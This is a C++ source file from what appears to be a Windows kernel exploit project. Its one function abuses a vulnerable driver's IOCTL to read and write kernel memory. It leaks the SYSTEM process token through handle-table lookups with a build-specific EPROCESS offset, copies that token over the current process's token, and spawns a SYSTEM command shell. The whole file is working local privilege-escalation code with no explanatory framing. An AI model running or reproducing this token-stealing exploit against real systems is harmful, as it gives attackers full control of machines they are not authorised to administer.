#include "include/exp/arbitraryWrite.hpp"
namespace exploit
{
    namespace arbitrary
    {
        void write(HANDLE hDevice, unsigned int ioctl) {
            ULONG_PTR systemTokenAddr;
            if (!exploit::memtools::bFindHandleObject(4, 4, reinterpret_cast<ULONG_PTR>(&systemTokenAddr))) {
                std::cerr << "[x]can't leak from kernel handle\n";
                return;
            }
            systemTokenAddr += exploit::gadget::X_19045_2006::offsetTokenEproc;

            ULONG_PTR systemTokenVal;
            args leak = { reinterpret_cast<PVOID>(systemTokenAddr), &systemTokenVal };
            DWORD ioctlResult;
            DeviceIoControl(hDevice, ioctl,
                &leak, sizeof(args),
                NULL, 0,
                &ioctlResult, NULL);
            printf("[+]system token address 0x%p = 0x%p\n", systemTokenAddr, systemTokenVal);

            ULONG_PTR processTokenAddr;
            HANDLE process = OpenProcess(PROCESS_QUERY_INFORMATION, 0, GetCurrentProcessId());
            if (!exploit::memtools::bFindHandleObject(GetCurrentProcessId(), reinterpret_cast<ULONG_PTR>(process), reinterpret_cast<ULONG_PTR>(&processTokenAddr))) {
                std::cerr << "[x]can't leak process token addr from kernel handle\n";
                return;
            }
            processTokenAddr += exploit::gadget::X_19045_2006::offsetTokenEproc;
            printf("[+]system token address 0x%p\n", processTokenAddr);
            systemTokenVal &= 0xfffffffffffffff0;

            args payload = { &systemTokenVal, reinterpret_cast<PVOID>(processTokenAddr) };
            DeviceIoControl(hDevice, ioctl,
                &payload, sizeof(args),
                NULL, 0,
                &ioctlResult, NULL);
            printf("[+]payload delivered, spawn cmd\n");
            system("cmd");
        }
    } // namespace stackoverflow

} // namespace exploit